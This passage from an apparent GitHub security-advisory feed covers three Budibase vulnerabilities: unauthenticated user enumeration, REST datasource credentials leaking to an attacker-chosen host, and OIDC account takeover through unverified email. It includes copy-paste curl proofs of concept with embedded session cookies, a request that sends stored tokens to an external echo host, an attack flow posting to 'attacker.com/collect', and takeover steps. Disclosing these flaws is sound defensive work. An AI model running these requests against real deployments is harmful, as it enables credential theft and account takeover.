-<p><strong>Static verification:</strong></p>
-<ol>
-<li>Observe <code>packages/worker/src/api/index.ts:56-59</code>: endpoint in <code>PUBLIC_ENDPOINTS</code> with <code>// TODO: This should be an internal api</code></li>
-<li>Trace handler at <code>packages/worker/src/api/controllers/global/users.ts:548-562</code>: no auth checks, returns <code>ctx.body = user</code> (full object)</li>
-<li>Trace middleware chain: all middleware passes through for <code>ctx.publicEndpoint === true</code></li>
-<li>Confirm no field filtering, sanitization, or authorization between request and response</li>
-</ol>
-<p><strong>Dynamic verification (requires running Budibase instance with at least one user):</strong></p>
-<pre><code class="language-bash"># No authentication headers or cookies required
-# Lookup by email:
-curl -s http://localhost:4002/api/global/users/tenant/admin@example.com
-
-# Response (200 OK):
-# {
-#   "_id": "admin@example.com",
-#   "_rev": "1-abc123...",
-#   "tenantId": "tenant-uuid-here",
-#   "userId": "us_uuid-here"
-# }
-
-# Lookup by user ID:
-curl -s http://localhost:4002/api/global/users/tenant/us_someuserid123
-
-# Response (200 OK):
-# {
-#   "_id": "us_someuserid123",
-#   "_rev": "1-abc123...",
-#   "tenantId": "tenant-uuid-here",
-#   "email": "admin@example.com",
-#   "ssoId": "google-oauth-id"
-# }
-
-# Non-existent user:
-curl -s http://localhost:4002/api/global/users/tenant/nonexistent@example.com
-# Response: 400 "No tenant user found."
-# (Different response confirms user enumeration)
-</code></pre>
-<p><strong>Negative case:</strong> Requesting a non-existent user returns HTTP 400 with <code>"No tenant user found."</code>, while an existing user returns HTTP 200 with full data. The different status codes confirm user existence, enabling enumeration.</p>
-<h4 id="impact">Impact</h4>
-<p>This is a <strong>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</strong> vulnerability.</p>
-<p><strong>Who is impacted:</strong> All Budibase deployments — both self-hosted and cloud. The impact is highest for multi-tenant (cloud) deployments where tenant IDs are security boundaries and user enumeration across tenants enables targeted attacks.</p>
-<p>An unauthenticated attacker can:</p>
-<ol>
-<li><strong>Enumerate all user accounts</strong> by testing known or guessed email addresses against the endpoint</li>
-<li><strong>Extract tenant IDs</strong> for any known user, enabling targeted cross-tenant attacks</li>
-<li><strong>Extract user IDs</strong> (<code>userId</code>) for use in other API calls or attacks</li>
-<li><strong>Extract SSO identifiers</strong> (<code>ssoId</code>) which may link to external identity providers (Google, OIDC)</li>
-<li><strong>Confirm user existence</strong> through different HTTP responses (200 vs 400)</li>
-<li><strong>Harvest CouchDB revision tokens</strong> (<code>_rev</code>) which could assist in CouchDB-level attacks</li>
-</ol>
-<p>The returned tenant IDs are particularly dangerous in multi-tenant deployments because they identify the security boundary between organizations. Combined with the hardcoded session keys (separate finding), an attacker could use enumerated tenant IDs to craft targeted session fixation attacks.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<ol>
-<li><strong>Remove the endpoint from <code>PUBLIC_ENDPOINTS</code></strong> and move it to internal-only routes, as the TODO comment at line 56 already suggests</li>
-<li><strong>Add authentication and authorization</strong> if the endpoint must remain accessible — require at least <code>builderOrAdmin</code> role</li>
-<li><strong>Limit returned fields</strong> to only what the consumer actually needs (strip <code>_rev</code>, <code>ssoId</code>, and other sensitive fields)</li>
-<li><strong>Return generic 404</strong> for both "not found" and "access denied" to prevent user enumeration</li>
-<li><strong>Add rate limiting</strong> to prevent automated mass enumeration</li>
-<li><strong>Regression test:</strong> Add a test verifying <code>GET /api/global/users/tenant/:id</code> returns 403 without authentication</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-hr66-5mqr-8mpx">https://github.com/Budibase/budibase/security/advisories/GHSA-hr66-5mqr-8mpx</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19221">https://github.com/Budibase/budibase/pull/19221</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/e6bf245fbfdaa35804ef7ee901103282edf0c381">https://github.com/Budibase/budibase/commit/e6bf245fbfdaa35804ef7ee901103282edf0c381</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.32">https://github.com/Budibase/budibase/releases/tag/3.39.32</a></li>
-<li><a href="https://github.com/advisories/GHSA-hr66-5mqr-8mpx">https://github.com/advisories/GHSA-hr66-5mqr-8mpx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hr66-5mqr-8mpx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:25:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: Unauthenticated REST Datasource Credential Theft via Cross-Origin Auth Leak ]]></title>
-        <id>https://github.com/advisories/GHSA-mqhr-6j6h-74p5</id>
-        <link href="https://github.com/advisories/GHSA-mqhr-6j6h-74p5"/>
-        <updated>2026-07-24T21:22:52.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Budibase attaches a REST datasource's stored credentials (Bearer/Basic tokens and static headers) to an outgoing request before it decides which host the request goes to, and never checks that the destination host matches the datasource. A query's request path can be pointed at any host (via an absolute URL or a user-supplied <code>{{ parameter }}</code>), so the stored credentials are delivered to an attacker-chosen server. Because a query can be published with the PUBLIC role, this is reachable by a fully unauthenticated attacker with one HTTP request. The credentials are masked (<code>--secret-value--</code>) everywhere in the API, yet this recovers them in cleartext. This is a bypass of GHSA-3gp5 (which fixed the base-URL rewrite vector but added no same-origin check; the query-path vector remains, now unauthenticated).</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>packages/server/src/integrations/rest.ts</code>: <code>_req()</code> builds <code>authHeaders = getAuthHeaders(...)</code> from the stored auth configs and merges them with <code>config.defaultHeaders</code> into every request, before the URL is resolved. <code>getUrl()</code>: if the (parameter-enriched) query <code>path</code> starts with <code>http</code>, the datasource base URL is ignored and <code>path</code> becomes the absolute request URL. There is no comparison between the resolved request host and the datasource base host before the credentials are attached. The execute route <code>POST /api/v2/queries/:queryId</code> runs under <code>authorized(QUERY, WRITE)</code>; a query published at role PUBLIC is executable with no session.</p>
-<p>POC </p>
-<h2 id="reproduction--copy-each-line-paste-in-your-terminal-press-enter">Reproduction — copy each line, paste in your terminal, press Enter,</h2>
-<p>Line 1:</p>
-<pre><code>DSID=$(curl -s -X POST "https://hasinocompany.budibase.app/api/datasources" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"poc-rest","source":"REST","type":"datasource","config":{"url":"https://example.org","authConfigs":[{"_id":"ac1","name":"tok","type":"bearer","config":{"token":"UNAUTH_LEAK_TOKEN_5150"}}],"defaultHeaders":{"X-Static-Secret":"STATIC_HDR_LEAK_4242"}}},"fetchSchema":false,"tablesFilter":[]}' | python3 -c "import sys,json;print(json.load(sys.stdin)['datasource']['_id'])"); echo "datasource=$DSID"
-
-RESPONSE
-
-datasource=datasource_9938805b2d0348a4a4f28dc9d1c97f19
-
-</code></pre>
-<p>Line 2:</p>
-<pre><code>QID=$(curl -s -X POST "https://hasinocompany.budibase.app/api/queries" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d "{\"datasourceId\":\"$DSID\",\"name\":\"pocq\",\"parameters\":[{\"name\":\"t\",\"default\":\"\"}],\"fields\":{\"path\":\"{{ t }}\",\"bodyType\":\"none\",\"authConfigId\":\"ac1\",\"authConfigType\":\"bearer\"},\"queryVerb\":\"read\",\"transformer\":\"return data\",\"schema\":{},\"readable\":true}" | python3 -c "import sys,json;print(json.load(sys.stdin)['_id'])"); echo "query=$QID"
-</code></pre>
-<p>RESPONSE</p>
-<p>query=query_datasource_9938805b2d0348a4a4f28dc9d1c97f19_7727920d8ccb4708a495eafb5a1351a7</p>
-<p>Line 3:</p>
-<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/permission/PUBLIC/$QID/write" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" &gt;/dev/null; curl -s -X POST "https://hasinocompany.budibase.app/api/permission/PUBLIC/$QID/read" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" &gt;/dev/null; curl -s -X POST "https://hasinocompany.budibase.app/api/applications/app_dev_hasinocompany_bcb6316e0d014f91939c812389012415/publish" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" &gt;/dev/null; echo published
-</code></pre>
-<p>RESPONSE</p>
-<p>published</p>
-<p>Line 4 — THE BUG (anonymous, no cookie — this prints the leaked Bearer UNAUTH_LEAK_TOKEN_5150):</p>
-<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/v2/queries/$QID" -H "x-budibase-app-id: app_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"parameters":{"t":"https://postman-echo.com/get"}}'
-</code></pre>
-<p>RESPONSE </p>
-<p>{"data":[{"args":{},"headers":{"host":"postman-echo.com","accept":"<em>/</em>","accept-language":"*","accept-encoding":"gzip, br","user-agent":"undici","sec-fetch-mode":"cors","x-static-secret":"STATIC_HDR_LEAK_4242","authorization":"Bearer UNAUTH_LEAK_TOKEN_5150","x-datadog-trace-id":"3035031720617373998","x-datadog-parent-id":"5509262114738533737","x-datadog-sampling-priority":"0","x-datadog-tags":"_dd.p.tid=6a56b19a00000000,_dd.p.llmobs_ml_app=app-service","traceparent":"00-6a56b19a000000002a1e99450570f12e-4c74d4b43b81f569-00","tracestate":"dd=t.tid:6a56b19a00000000;t.dm:-1;s:0;p:4c74d4b43b81f569","x-forwarded-proto":"https"},"url":"<a href="https://postman-echo.com/get%22%7D%5D,%22pagination%22:%7B%7D,%22headers%22:%7B%22cf-cache-status%22:%22DYNAMIC%22,%22cf-ray%22:%22a1b3cda318a3f0e7-DUB%22,%22content-encoding%22:%22gzip%22,%22content-type%22:%22application/json">https://postman-echo.com/get"}],"pagination":{},"headers":{"cf-cache-status":"DYNAMIC","cf-ray":"a1b3cda318a3f0e7-DUB","content-encoding":"gzip","content-type":"application/json</a>; charset=utf-8","date":"Tue, 14 Jul 2026 22:00:58 GMT","etag":"W/"292-YpfNwvZmX1jVU7GPgCQX7hoZtMw"","server":"cloudflare","set-cookie":"_cfuvid=lJDfxAv0j6gmoaOpkyXVKpYK0yYSlYwgBjSHcA.rn.0-1784066458.0972874-1.0.1.1-q7WOtNlMsl5YmqkV34ms7hdy4oi1sw17X9IguTaJOKE; HttpOnly; SameSite=None; Secure; Path=/; Domain=postman-echo.com","vary":"Accept-Encoding","x-envoy-upstream-service-time":"4"},"code":200,"size":"658B","time":"139ms"}  </p>
-<h3 id="actual-output-of-line-4-the-leaked-credential">Actual output of Line 4 (the leaked credential)</h3>
-<p>The anonymous request returns HTTP 200; the outbound <code>headers</code> echoed by <code>postman-echo.com</code> contain the datasource's stored, otherwise-masked credentials:</p>
-<pre><code class="language-json">{"data":[{"headers":{"host":"postman-echo.com","x-static-secret":"STATIC_HDR_LEAK_4242","authorization":"Bearer UNAUTH_LEAK_TOKEN_5150"}}]}
-</code></pre>
-<p><code>authorization: Bearer UNAUTH_LEAK_TOKEN_5150</code> and <code>x-static-secret: STATIC_HDR_LEAK_4242</code> were delivered to a host chosen by a fully anonymous caller. Confirmed 3/3 separate runs.</p>
-<h2 id="full-real-world-attack">Full Real-World Attack</h2>
-<pre><code>1. A builder has a REST datasource with stored auth (Bearer/API key) and a query
-   whose path uses a parameter, published at PUBLIC (customer-facing app).
-2. The attacker needs no account. They read the published app id + query id from
-   the published app, then send ONE request:
-     POST /api/v2/queries/&lt;queryId&gt;
-     x-budibase-app-id: &lt;prodAppId&gt;
-     {"parameters":{"t":"https://attacker.com/collect"}}
-3. Budibase attaches Authorization: Bearer &lt;token&gt; and sends it to attacker.com.
-4. attacker.com logs the header =&gt; the datasource's secret token.
-5. The attacker calls the third-party API directly as the victim organisation.
-</code></pre>
-<h2 id="impact">Impact</h2>
-<table>
-<thead>
-<tr>
-<th>Who / what is affected</th>
-<th>How</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Every REST datasource with stored auth used by a PUBLIC query</td>
-<td>Its Bearer/Basic token + static headers are exfiltrated</td>
-</tr>
-<tr>
-<td>The third-party service behind that datasource</td>
-<td>Attacker uses the stolen token directly (data theft / abuse)</td>
-</tr>
-<tr>
-<td>Unauthenticated attackers</td>
-<td>One request, no login, no CSRF, no user interaction</td>
-</tr>
-<tr>
-<td>The credential-masking control</td>
-<td>Fully defeated - masked secrets recovered in cleartext</td>
-</tr>
-</tbody></table>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<ol>
-<li>Before attaching stored auth, require the resolved request host to equal the datasource base host (strict same-origin check); strip stored credentials on any cross-origin resolution.</li>
-<li>Reject absolute-URL query paths and host/scheme changes introduced via path parameter bindings.</li>
-<li>Re-audit the GHSA-3gp5 fix - it closed the base-URL rewrite vector only; the query-path vector remained and is now reachable unauthenticated.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-mqhr-6j6h-74p5">https://github.com/Budibase/budibase/security/advisories/GHSA-mqhr-6j6h-74p5</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19239">https://github.com/Budibase/budibase/pull/19239</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/8b1bca71501b11c68310351ef4f2c3028b2d5f08">https://github.com/Budibase/budibase/commit/8b1bca71501b11c68310351ef4f2c3028b2d5f08</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.1">https://github.com/Budibase/budibase/releases/tag/3.40.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-mqhr-6j6h-74p5">https://github.com/advisories/GHSA-mqhr-6j6h-74p5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mqhr-6j6h-74p5</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-24T21:22:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: OIDC SSO account takeover: incoming identity linked by email without checking email_verified]]></title>
-        <id>https://github.com/advisories/GHSA-hp6v-6jw7-gv2f</id>
-        <link href="https://github.com/advisories/GHSA-hp6v-6jw7-gv2f"/>
-        <updated>2026-07-24T21:17:41.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Budibase's OIDC SSO login links an incoming SSO identity to an existing Budibase account <strong>by email address alone</strong>, without ever checking the <code>email_verified</code> claim of the OIDC ID token. Budibase first tries to match the IdP <code>sub</code>; when that misses (any fresh attacker IdP account) it silently falls back to matching by the <code>email</code> claim and <strong>merges into the existing account by email</strong>, preserving that account's <code>_id</code> and roles. Because the <code>email_verified</code> flag is never read, an attacker who can make a <strong>configured/trusted</strong> IdP emit a token carrying <code>email = &lt;victim&gt;</code> with <code>email_verified = false</code> is logged into Budibase <strong>as the victim</strong>, inheriting the victim's roles (including global admin/builder). Per OIDC Core §5.7 the <code>email</code> claim MUST NOT be used as an identity key unless <code>email_verified</code> is <code>true</code>; Budibase effectively delegates all account-linking trust to every configured IdP's email-verification policy while checking nothing itself. Full account takeover of any existing Budibase user, including the instance owner.</p>
-<h3 id="details">Details</h3>
-<p>The OIDC verify callback extracts the email and never consults <code>email_verified</code>:</p>
-<ul>
-<li><code>packages/backend-core/src/middleware/passport/sso/oidc.ts:59</code> — <code>email: getEmail(profile, jwtClaims)</code>.</li>
-<li><code>getEmail</code> (<code>oidc.ts:113-135</code>) returns <code>profile._json.email</code> -&gt;<code>jwtClaims.email</code> -&gt; <code>preferred_username</code>. <strong>No <code>email_verified</code> check.</strong></li>
-<li><code>buildJwtClaims</code> (<code>oidc.ts:99-107</code>) assembles claims from <code>_json.email</code>/<code>emails[0].value</code> — no verification flag is read. <code>grep -r email_verified packages/</code> -&gt; 0 hits.</li>
-</ul>
-<p>The email is then used as the <strong>account-linking key</strong>:</p>
-<ul>
-<li><code>sso.authenticate(...)</code> -&gt; <code>packages/backend-core/src/middleware/passport/sso/sso.ts</code>:<ul>
-<li><code>:38,44</code> <code>users.getById(generateGlobalUserID(details.userId))</code> keyed on the IdP <code>sub</code>; for a fresh attacker IdP account this 404s and is swallowed (<code>:45-54</code>).</li>
-<li><code>:57-59</code> <strong>fallback:</strong> <code>dbUser = await users.getGlobalUserByEmail(details.email)</code> -&gt; loads the <strong>victim's</strong> account (victim <code>_id</code> + roles) purely by email (<code>packages/backend-core/src/users/users.ts:100-124</code>, <code>USER_BY_EMAIL</code> view, no binding to the IdP <code>sub</code>).</li>
-<li><code>syncUser(...)</code> (<code>sso.ts:80,102-138</code>) spreads <code>...user</code>, preserving the victim <code>_id</code>/<code>tenantId</code>/<code>roles</code>; only overwrites provider fields.</li>
-</ul>
-</li>
-<li><code>UserDB.save</code> (<code>packages/backend-core/src/users/db.ts:235</code>): because <code>ssoUser._id</code> is the victim's, the <code>_id</code> branch runs (<code>:253</code>), <code>getById(_id)</code> matches the victim (<code>:256</code>), the "Email address cannot be changed" guard (<code>:257-259</code>) does not fire (<code>dbUser.email === email</code>), and the <code>EmailUnavailableError</code> guard (<code>:269-275</code>) is skipped (it only runs in the <code>!dbUser</code> branch). The merge proceeds silently; a session JWT is issued for the victim.</li>
-</ul>
-<p>Per OIDC Core §5.7, the <code>email</code> claim MUST NOT be used as an identity key unless <code>email_verified</code> is <code>true</code>. Budibase never reads the flag.</p>
-<p><strong>Preconditions (attack requirement — <code>AT:P</code>):</strong> the attacker must be able to authenticate through an IdP that the Budibase instance <strong>trusts</strong> AND get that IdP to assert the victim's email with <code>email_verified = false</code>. This is reachable, not exotic:</p>
-<ul>
-<li><strong>Self-registration with an unverified email — Keycloak and Authentik ship with <em>"Verify Email" OFF by default</em>; if the trusted IdP allows public sign-up, the attacker registers a new account and simply enters <code>email = &lt;victim&gt;</code> at sign-up. No confirmation email is needed — the IdP stores and asserts it unverified.</strong></li>
-<li><strong>Self-service profile editing</strong> — many IdPs let a logged-in user change their own email without forced re-verification.</li>
-<li><strong>Attacker-operated / federated IdP or permissive social login</strong> — where the attacker controls or influences a trusted provider, or the provider asserts a user-typed (unverified) email.
-It is <strong>not</strong> exploitable through a strict corporate IdP that enforces email verification (there <code>email_verified = true</code> and the attacker cannot claim the victim's address) — which is exactly why Budibase must check the flag rather than assume every configured IdP enforces it. The defect is unconditional on the Budibase side; the attack requirement is purely the (default, common) IdP email policy.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>Reproduced live on Budibase <code>3.39.14</code> (self-hosted, community license) against a stock <strong>Keycloak 26</strong> realm <code>budi</code> with default "Verify Email" = off; OIDC client registered and activated in Budibase.</p>
-<p><strong>Setup:</strong> a pre-existing <strong>victim</strong> global-admin Budibase account <code>victim@stand.local</code> (<code>_id = us_1ab2dfcf…</code>, local account, <em>no IdP link</em>). The attacker owns their <strong>own</strong> IdP account (<code>attacker</code>, distinct <code>sub</code>) and can set its email attribute unverified.</p>
-<p><strong>Step 1 — the IdP asserts the claim (proves <code>email_verified=false</code>):</strong></p>
-<pre><code>POST /realms/budi/protocol/openid-connect/token   (Keycloak)
-grant_type=password&amp;client_id=budibase&amp;client_secret=…&amp;username=attacker&amp;password=Attacker123!&amp;scope=openid email profile
--&gt; id_token payload: { "sub":"3cf58c45-…", "preferred_username":"attacker",
-                      "email":"victim@stand.local", "email_verified":false }
-</code></pre>
-<p>The authenticated principal is provably <strong><code>attacker</code></strong> (its own <code>sub</code>/<code>preferred_username</code>/password), merely <em>claiming</em> the victim's email, unverified.</p>
-<img width="1484" height="685" alt="image" src="https://github.com/user-attachments/assets/cdddac3c-b7c0-4c59-aaec-9092706a7ad8">
-
-
-<p><strong>Step 2 — drive the standard OIDC flow</strong> as <code>attacker</code>:
-<code>GET /api/global/auth/default/oidc/configs/kc-oidc-1</code> -&gt; IdP login as <code>attacker</code>/<code>Attacker123!</code> -&gt; <code>GET /api/global/auth/oidc/callback?code=…&amp;state=…</code>.</p>
-<img width="1145" height="454" alt="image" src="https://github.com/user-attachments/assets/ac0a73d0-c5fc-4d0f-b9b0-95f6273b99f7">
-
-<img width="1172" height="445" alt="image" src="https://github.com/user-attachments/assets/a4b27a7e-4293-4caf-957f-d27c54ea461a">
-
-<img width="1157" height="648" alt="image" src="https://github.com/user-attachments/assets/06699774-92b0-4163-a171-9a30bc877ecc">
-
-<img width="1201" height="525" alt="image" src="https://github.com/user-attachments/assets/92a92fcf-9d29-42ca-921d-de6fbd78198f">
-
-
-
-<p><strong>Step 3 — result (takeover):</strong> Budibase sets <code>budibase:auth</code> to a session JWT
-<code>{ "userId":"us_1ab2dfcf…", "email":"victim@stand.local", "tenantId":"default" }</code>, and
-<code>GET /api/global/self</code> returns the <strong>victim</strong>: <code>_id = us_1ab2dfcf…</code>, <code>admin.global = true</code>, <code>builder.global = true</code>, <code>providerType = oidc</code>. The attacker authenticated as a <em>different</em> IdP principal with an <em>unverified</em> email yet now holds a full global-admin session for the victim.</p>
-<img width="1001" height="456" alt="image" src="https://github.com/user-attachments/assets/c8dfc25f-aed7-4cd7-9323-f029e4d1a725">
-
-
-<p><strong>Negative control (proves the email claim is the cause, not a normal self-login):</strong>
-A second attacker <code>attacker2</code> with a <strong>benign</strong> unverified email <code>attacker2@evil.local</code> (matching no Budibase user) runs the <em>identical</em> flow:</p>
-<pre><code>id_token: { "sub":"55794bf2-…", "preferred_username":"attacker2", "email":"attacker2@evil.local", "email_verified":false }
--&gt; budibase:auth: { "userId":"us_55794bf2-…" }   (a NEW account, _id derived from the IdP sub)
--&gt; /api/global/self: { "_id":"us_55794bf2-…", "email":"attacker2@evil.local", admin.global: null, builder.global: null }
-</code></pre>
-<img width="1153" height="489" alt="image" src="https://github.com/user-attachments/assets/8f6cb849-e6f3-49f1-b576-8aeba026a3be">
-
-<img width="1089" height="466" alt="image" src="https://github.com/user-attachments/assets/a892ec3e-3753-4bc0-9eee-9f0613b2d92e">
-
-<img width="826" height="532" alt="image" src="https://github.com/user-attachments/assets/cc30bd9c-1bdb-4bea-934f-a8b3e228940e">
-
-
-<p>With a benign email the attacker gets <strong>their own new low-privilege account</strong>; only when the email claim equals the victim's does the same flow yield the <strong>victim's admin account</strong>. Same self-authentication, single variable changed = the unverified-email merge is the vulnerability.</p>
-<h3 id="impact">Impact</h3>
-<p>Takeover of any existing Budibase account by email, including the instance owner / global admin -&gt; full control of the tenant (apps, datasources, automations, user management, stored datasource credentials). The attacker authenticates as their <em>own</em> (different) IdP principal and ends up holding the victim's session and roles. The only requirement beyond a trusted IdP login is that the IdP assert the victim's email unverified — the default for a freshly-created Keycloak/Authentik realm and common in social logins (see Preconditions). Any deployment that trusts an OIDC IdP without enforced email verification is exposed; the Budibase-side flaw (ignoring <code>email_verified</code>) is unconditional.</p>
-<h3 id="remediation">Remediation</h3>
-<p><strong>Primary fix:</strong> in the OIDC verify path, require <code>email_verified === true</code> before using <code>email</code> to look up / link an existing account; otherwise reject the login (or fall back to <code>sub</code>-only matching and never merge into a pre-existing local/SSO account). Concretely, thread the <code>email_verified</code> claim through <code>buildJwtClaims</code>/<code>getEmail</code> (<code>oidc.ts</code>) and gate the <code>getGlobalUserByEmail</code> fallback in <code>sso.ts:57-59</code> on it.</p>
-<p><strong>Audit the whole class:</strong> apply the same <code>email_verified</code> (and, for SAML, <code>EmailVerified</code>/assertion-signature) gate to every SSO strategy that links by email — OIDC, SAML, and any social provider — not only the Google strategy (which already passes <code>requireLocalAccount=true</code>). Email-based account linking anywhere must require a verified email.</p>
-<p><strong>Defense-in-depth for operators who cannot patch immediately:</strong></p>
-<ul>
-<li>On the IdP, enable "Verify Email" / require verified email before issuing tokens (Keycloak: realm -&gt; Login -&gt; Verify Email = on), and restrict which email domains the IdP will assert.</li>
-<li>Prefer <code>sub</code>-based account mapping over email in the IdP/Budibase mapping config where available.</li>
-<li>Audit existing accounts for unexpected OIDC links to privileged users; rotate sessions.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-hp6v-6jw7-gv2f">https://github.com/Budibase/budibase/security/advisories/GHSA-hp6v-6jw7-gv2f</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/9ecd0048d9c3ae0ee9bd0e6204c621794dd1a4d3">https://github.com/Budibase/budibase/commit/9ecd0048d9c3ae0ee9bd0e6204c621794dd1a4d3</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
